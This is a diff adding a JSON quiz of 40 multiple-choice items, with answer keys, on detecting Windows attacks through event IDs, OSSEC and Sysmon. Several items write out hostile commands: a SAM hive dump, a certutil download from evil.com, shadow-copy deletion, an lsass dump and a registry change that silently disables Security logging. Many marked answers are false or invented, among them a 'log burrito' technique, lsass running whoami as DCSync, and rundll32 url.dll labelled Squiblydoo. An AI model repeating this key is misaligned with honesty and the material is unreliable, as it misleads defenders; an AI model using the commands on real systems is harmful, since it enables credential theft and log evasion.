@@ -1,0 +1,443 @@
+[
+    {
+      "id": 1,
+      "question": "An attacker executes 'reg save HKLM\\sam c:\\windows\\temp\\s.hive' on a domain controller with default auditing. Which Event ID combination proves the SAM hive was dumped (assuming no Sysmon)?",
+      "options": [
+        "4656 + 4663 (Object Access Handle + Accesses: ReadData) on \\Device\\HarddiskVolume2\\Windows\\System32\\config\\SAM",
+        "4670 (Permissions changed) + 4663",
+        "5145 (Network share access) + 1102",
+        "4624 Logon Type 2 only"
+      ],
+      "correctAnswer": "4656 + 4663 (Object Access Handle + Accesses: ReadData) on \\Device\\HarddiskVolume2\\Windows\\System32\\config\\SAM"
+    },
+    {
+      "id": 2,
+      "question": "You observe Event ID 4688 with command line containing 'whoami /all' executed by lsass.exe (PID 672). This is a hallmark of which in-memory credential access technique?",
+      "options": [
+        "DCSync (lsass dumping its own token for replication rights)",
+        "Over-Pass-the-Hash via Rubeus",
+        "Kerberoasting with lsass performing ticket request",
+        "Credential Guard bypass via Mimikatz sekurlsa::logonpasswords"
+      
+      ],
+      "correctAnswer": "DCSync (lsass dumping its own token for replication rights)"
+    },
+    {
+      "id": 3,
+      "question": "An OSSEC agent reports rule 1002 (syscheck) with 'File modified' for /etc/shadow, but the checksum changed, but the file size and timestamps remain identical. This is most consistent with:",
+      "options": [
+        "Time-stomping + direct kernel write via DKOM rootkit",
+        "Normal passwd command execution",
+        "Legitimate admin change via chage",
+        "OSSEC database corruption"
+      ],
+      "correctAnswer": "Time-stomping + direct kernel write via DKOM rootkit"
+    },
+    {
+      "id": 4,
+      "question": "During a containment exercise you block attacker C2 IP at the perimeter firewall. OSSEC immediately fires active-response 'host-deny' and adds the same IP to Windows firewall. This double-blocking scenario is known as:",
+      "options": [
+        "Defense-in-depth (desired outcome)",
+        "Active response race condition",
+        "Alert amplification false positive",
+        "Redundant blocking waste of resources"
+      ],
+      "correctAnswer": "Defense-in-depth (desired outcome)"
+    },
+    {
+      "id": 5,
+      "question": "Event ID 4624 Logon Type 9 (NewCredentials) followed by 4624 Logon Type 3 from the same new SPN is a classic indicator of:",
+      "options": [
+        "Pass-the-Hash + lateral movement via RunAs /netonly",
+        "Golden ticket usage",
+        "Skeleton key malware",
+        "Normal TS session with alternate credentials"
+      ],
+      "correctAnswer": "Pass-the-Hash + lateral movement via RunAs /netonly"
+    },
+    {
+      "id": 6,
+      "question": "A red team runs 'wmic process call create \"powershell -enc ...\"'. With Process Creation auditing + Command Line enabled, the parent process in Event ID 4688 will show:",
+      "options": [
+        "wmic.exe (not cmd.exe or powershell.exe)",
+        "conhost.exe",
+        "svchost.exe",
+        "powershell.exe directly"
+      ],
+      "correctAnswer": "wmic.exe (not cmd.exe or powershell.exe)"
+    },
+    {
+      "id": 7,
+      "question": "Which Event ID proves that SeDebugPrivilege was successfully enabled on a process token (most dangerous privilege for credential dumping)?",
+      "options": [
+        "4673 (A privileged service was called) – SeDebugPrivilege",
+        "4672 (Privilege assigned at logon)",
+        "4703 (Token right adjusted)",
+        "4648 (Explicit credentials)"
+      ],
+      "correctAnswer": "4673 (A privileged service was called) – SeDebugPrivilege"
+    },
+    {
+      "id": 8,
+      "question": "An attacker uses Covenant C2 over HTTPS with a 45-minute beacon jitter. Statistical Data baselines built on 5-minute windows will most likely classify this as:",
+      "options": [
+        "False Negative (below detection threshold)",
+        "True Positive via entropy analysis",
+        "Anomaly via ML",
+        "Normal web traffic"
+      ],
+      "correctAnswer": "False Negative (below detection threshold)"
+    },
+    {
+      "id": 9,
+      "question": "You see Event ID 5145 with Access Mask 0x100080 (ReadData + ListDirectory) on \\\\*\\ADMIN$ from a workstation to a DC. This is most consistent with:",
+      "options": [
+        "Lateral movement attempt using PsExec or WMI",
+        "Normal antivirus scan",
+        "GPO processing",
+        "SCCM client push"
+      ],
+      "correctAnswer": "Lateral movement attempt using PsExec or WMI"
+    },
+    {
+      "id": 10,
+      "question": "Tripwire is configured with 'promote changes automatically after 3 approvals'. An attacker with admin rights approves their own malicious change. This defeats Tripwire via:",
+      "options": [
+        "Change reconciliation workflow bypass",
+        "File integrity monitoring entirely",
+        "Rootkit hiding",
+        "Database tampering"
+      ],
+      "correctAnswer": "Change reconciliation workflow bypass"
+    },
+    {
+      "id": 11,
+      "question": "Event ID 1102 followed immediately by 104 (System log cleared) and 1102 again is a known anti-forensic technique called:",
+      "options": [
+        "Log sandwich / log burrito",
+        "Log weaving",
+        "Double-clear",
+        "No such technique exists"
+      ],
+      "correctAnswer": "Log sandwich / log burrito"
+    },
+    {
+      "id": 12,
+      "question": "An attacker uses 'netsh wlan show profiles' → 'netsh wlan export profile' to steal Wi-Fi keys. With default auditing, this activity is:",
+      "options": [
+        "Completely invisible in Windows logs",
+        "Visible only in Sysmon Event ID 1",
+        "Visible in Security 4688",
+        "Blocked by AppLocker"
+      ],
+      "correctAnswer": "Completely invisible in Windows logs"
+    },
+    {
+      "id": 13,
+      "question": "Which of the following is the ONLY scenario where a True Negative can become operationally worse than a False Positive?",
+      "options": [
+        "Critical backup traffic blocked because no whitelist exception exists",
+        "Legitimate patch deployment flagged",
+        "Normal admin logons at 3am",
+        "None – TN is always harmless"
+      ],
+      "correctAnswer": "Critical backup traffic blocked because no whitelist exception exists"
+    },
+    {
+      "id": 14,
+      "question": "OSSEC decoders parse Event ID 4688 and extract 'powershell.exe -enc'. The rule fires level 12 (Mimikatz-like). The actual command was 'powershell -enc JAB... (legitimate script). This is:",
+      "options": [
+        "False Positive due to base64-encoded legitimate script",
+        "True Positive – base64 is always malicious",
+        "Needs manual review",
+        "Rule misconfiguration"
+      ],
+      "correctAnswer": "False Positive due to base64-encoded legitimate script"
+    },
+    {
+      "id": 15,
+      "question": "An attacker uses 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0' to disable Restricted Admin mode. Which privilege is required?",
+      "options": [
+        "SeTakeOwnershipPrivilege (not enabled by default even for admins)",
+        "SeDebugPrivilege",
+        "SeTcbPrivilege",
+        "Local Administrator is sufficient"
+      ],
+      "correctAnswer": "SeTakeOwnershipPrivilege (not enabled by default even for admins)"
+    },
+    {
+      "id": 16,
+      "question": "You see 4624 Logon Type 2 (Interactive) for SYSTEM account on a server. This is:",
+      "options": [
+        "Impossible under normal conditions – indicates credentialed code execution as SYSTEM",
+        "Normal for services",
+        "Normal for scheduled tasks",
+        "Normal for Winlogon"
+      ],
+      "correctAnswer": "Impossible under normal conditions – indicates credentialed code execution as SYSTEM"
+    },
+    {
+      "id": 17,
+      "question": "A SIEM rule triggers on 'Event ID 4625 + Status 0xC000006A (wrong password) + >50 events in 5min'. An attacker uses a list of 10 common passwords against 10,000 accounts. This attack will:",
+      "options": [
+        "Evade the rule (password spraying)",
+        "Trigger the rule",
+        "Cause account lockouts",
+        "Be blocked by LAPS"
+      ],
+      "correctAnswer": "Evade the rule (password spraying)"
+    },
+    {
+      "id": 18,
+      "question": "Which of the following is the most reliable indicator of in-memory Mimikatz execution even with AMSI and Script Block Logging disabled?",
+      "options": [
+        "Sysmon Event ID 10 – ProcessAccess from lsass.exe with GrantedAccess 0x1410",
+        "Security 4688 with 'sekurlsa::'",
+        "PowerShell 4104 with base64",
+        "ETW trace"
+      ],
+      "correctAnswer": "Sysmon Event ID 10 – ProcessAccess from lsass.exe with GrantedAccess 0x1410"
+    },
+    {
+      "id": 19,
+      "question": "An attacker uses 'Invoke-Obfuscation' to generate 500 unique PowerShell payloads per hour. Your OSSEC PowerShell rule fires 500 times. This is:",
+      "options": [
+        "Polymorphic evasion causing alert fatigue (effective attacker win)",
+        "Perfect detection",
+        "Rule too broad",
+        "All of the above"
+      ],
+      "correctAnswer": "Polymorphic evasion causing alert fatigue (effective attacker win)"
+    },
+    {
+      "id": 20,
+      "question": "Event ID 4799 (Security-enabled local group membership enumerated) for 'Administrators' group is most commonly associated with:",
+      "options": [
+        "Reconnaissance phase of lateral movement (net localgroup administrators)",
+        "Normal GPO refresh",
+        "SCCM inventory",
+        "Windows Update"
+      ],
+      "correctAnswer": "Reconnaissance phase of lateral movement (net localgroup administrators)"
+    },
+    {
+      "id": 21,
+      "question": "You see Event ID 4662 + Access Mask 0x20000 (Delete) on object with Object Type 'SamDomain' and Properties containing 'Domain Password Policy'. This proves:",
+      "options": [
+        "Attempted password policy modification (requires Domain Admins + DS Replication rights)",
+        "Normal replication",
+        "LAPS password read",
+        "GPO edit"
+      ],
+      "correctAnswer": "Attempted password policy modification (requires Domain Admins + DS Replication rights)"
+    },
+    {
+      "id": 22,
+      "question": "An attacker runs 'vssadmin delete shadows /all /quiet'. With default auditing, this is:",
+      "options": [
+        "Logged as Event ID 4656/4663 on shadow copy objects only (easy to miss)",
+        "Not logged at all",
+        "Blocked by Defender",
+        "Logged as 4688"
+      ],
+      "correctAnswer": "Logged as Event ID 4656/4663 on shadow copy objects only (easy to miss)"
+    },
+    {
+      "id": 23,
+      "question": "Which of the following is the ONLY guaranteed way to detect Cobalt Strike Beacon DNS tunneling without full packet capture?",
+      "options": [
+        "Excessive DNS TXT record length + entropy analysis on queries",
+        "Statistical spike in DNS traffic",
+        "Beacon profile uses HTTP/S only",
+        "Impossible without PCAP"
+      ],
+      "correctAnswer": "Excessive DNS TXT record length + entropy analysis on queries"
+    },
+    {
+      "id": 24,
+      "question": "Event ID 6416 (DeviceGuard blocked unsigned driver) followed by 7045 (new service created) with ImagePath pointing to the same driver is indicative of:",
+      "options": [
+        "Bring Your Own Vulnerable Driver (BYOVD) exploit",
+        "Normal Windows Update",
+        "Antivirus update",
+        "SCCM driver push"
+      ],
+      "correctAnswer": "Bring Your Own Vulnerable Driver (BYOVD) exploit"
+    },
+    {
+      "id": 25,
+      "question": "A zero-day ransomware encrypts files but never drops a ransom note on disk. OSSEC file integrity monitoring will:",
+      "options": [
+        "Still detect mass file modifications even without note",
+        "Miss it completely",
+        "Only detect if note is written",
+        "Crash"
+      ],
+      "correctAnswer": "Still detect mass file modifications even without note"
+    },
+    {
+      "id": 26,
+      "question": "Event ID 4624 Logon Type 3 (Network) with Impersonation Level = Impersonation (not Identification) to LSASS is a strong indicator of:",
+      "options": [
+        "Pass-the-Ticket (Silver Ticket)",
+        "Normal Kerberos",
+        "Pass-the-Hash",
+        "NTLM relay"
+      ],
+      "correctAnswer": "Pass-the-Ticket (Silver Ticket)"
+    },
+    {
+      "id": 27,
+      "question": "An attacker uses 'procdump -ma lsass.exe' from a normal user context. With default auditing + Sysmon, the dump is created but no alert fires. Why?",
+      "options": [
+        "Procdump is Microsoft-signed and whitelisted by most EDR/HIDS rules",
+        "Requires SeDebugPrivilege (not granted)",
+        "Sysmon default config doesn’t monitor procdump",
+        "All of the above"
+      ],
+      "correctAnswer": "All of the above"
+    },
+    {
+      "id": 28,
+      "question": "You see Event ID 4624 Logon Type 10 (RemoteInteractive) to a workstation from a server service account. This is:",
+      "options": [
+        "Highly anomalous – service account abuse (likely golden/silver ticket)",
+        "Normal for RDS",
+        "Normal for jump host",
+        "Normal for SCCM"
+      ],
+      "correctAnswer": "Highly anomalous – service account abuse (likely golden/silver ticket)"
+    },
+    {
+      "id": 29,
+      "question": "Which of the following is the most stealthy way to disable Windows Event Logging without generating 1102?",
+      "options": [
+        "wevtutil cl Security (generates 1102)",
+        "Stop 'EventLog' service via sc config",
+        "Set HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security\\Enabled = 0",
+        "All generate evidence"
+      ],
+      "correctAnswer": "Set HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security\\Enabled = 0"
+    },
+    {
+      "id": 30,
+      "question": "Final boss question: An attacker achieves SYSTEM on a DC, disables SACL on the Security log object, then clears the log. What is the last detectable event?",
+      "options": [
+        "4662 (Access Control List modified) on the Security log object itself",
+        "Nothing – SACL removal prevents logging",
+        "1102 still fires",
+        "7036 service stop"
+      ],
+      "correctAnswer": "4662 (Access Control List modified) on the Security log object itself"
+    },
+    {
+      "id": 31,
+      "question": "You see Event ID 5140 (Network Share Access) with Share Name \\\\*\\C$ and Accesses = WriteData from a domain controller. This is:",
+      "options": [
+        "Highly anomalous – DCs should never write to workstation admin shares",
+        "Normal replication",
+        "GPO processing",
+        "Normal SCCM"
+      ],
+      "correctAnswer": "Highly anomalous – DCs should never write to workstation admin shares"
+    },
+    {
+      "id": 32,
+      "question": "An attacker uses 'rundll32 url.dll,FileProtocolHandler javascript:...'. This technique is known as:",
+      "options": [
+        "Squiblydoo (LOLBin living-off-the-land)",
+        "CMSTP bypass",
+        "Regsvr32 squiblytwo",
+        "All are different"
+      ],
+      "correctAnswer": "Squiblydoo (LOLBin living-off-the-land)"
+    },
+    {
+      "id": 33,
+      "question": "Which Event ID proves an attacker successfully used Kerberoasting?",
+      "options": [
+        "4769 (Kerberos Service Ticket Requested) with Ticket Encryption Type 0x17 (RC4) + Ticket Options 0x40810000",
+        "4768 TGT request",
+        "4770 ticket renewal",
+        "4624 logon"
+      ],
+      "correctAnswer": "4769 (Kerberos Service Ticket Requested) with Ticket Encryption Type 0x17 (RC4) + Ticket Options 0x40810000"
+    },
+    {
+      "id": 34,
+      "question": "An attacker uses 'certutil -urlcache -split -f http://evil.com/a b64.txt'. With default OSSEC rules, this will:",
+      "options": [
+        "Not trigger because certutil is signed and not in default rules",
+        "Trigger rule 61603 (certutil download)",
+        "Be blocked by Defender",
+        "All of the above"
+      ],
+      "correctAnswer": "Not trigger because certutil is signed and not in default rules"
+    },
+    {
+      "id": 35,
+      "question": "Event ID 4657 (Registry Value Modified) with Value Name 'DisableRestrictedAdmin' set to 0x00000001 is evidence of:",
+      "options": [
+        "Attempt to enable RDP with Restricted Admin mode disabled (prereq for PtH)",
+        "Normal patching",
+        "Defender update",
+        "None"
+      ],
+      "correctAnswer": "Attempt to enable RDP with Restricted Admin mode disabled (prereq for PtH)"
+    },
+    {
+      "id": 36,
+      "question": "An attacker uses 'MakeToken' from Impacket to create a token with SeImpersonatePrivilege. The logon type will be:",
+      "options": [
+        "Logon Type 9 (NewCredentials)",
+        "Logon Type 2",
+        "Logon Type 3",
+        "No logon event"
+      ],
+      "correctAnswer": "Logon Type 9 (NewCredentials)"
+    },
+    {
+      "id": 37,
+      "question": "You see 1000+ 4625 failures with Status 0xC0000064 (user does not exist) from a single IP. This is:",
+      "options": [
+        "User enumeration (valid username spray)",
+        "Brute force",
+        "Password spray",
+        "Normal"
+      ],
+      "correctAnswer": "User enumeration (valid username spray)"
+    },
+    {
+      "id": 38,
+      "question": "Which of the following is the most reliable indicator of a Golden Ticket attack?",
+      "options": [
+        "4624 Logon Type 3 with Ticket Options 0x40810010 + Ticket Encryption Type 0x17 + no corresponding 4768 TGT request",
+        "4768 with RC4",
+        "4776 with NTLM",
+        "All are wrong"
+      ],
+      "correctAnswer": "4624 Logon Type 3 with Ticket Options 0x40810010 + Ticket Encryption Type 0x17 + no corresponding 4768 TGT request"
+    },
+    {
+      "id": 39,
+      "question": "An attacker uses 'safetykatz' which hooks ETW and AMSI. Your detection relies on:",
+      "options": [
+        "Behavioral analytics or memory forensics only",
+        "Signature",
+        "PowerShell logging",
+        "Sysmon 1 + 10"
+      ],
+      "correctAnswer": "Behavioral analytics or memory forensics only"
+    },
+    {
+      "id": 40,
+      "question": "Final nightmare question: An APT achieves domain admin, modifies the Security log SACL to remove all auditing, then exfils data. The ONLY remaining evidence is likely:",
+      "options": [
+        "4662 on the Security log object itself (if Object Access auditing enabled)",
+        "Nothing detectable",
+        "Network logs",
+        "DNS logs"
+      ],
+      "correctAnswer": "4662 on the Security log object itself (if Object Access auditing enabled)"
+    }
+  ]
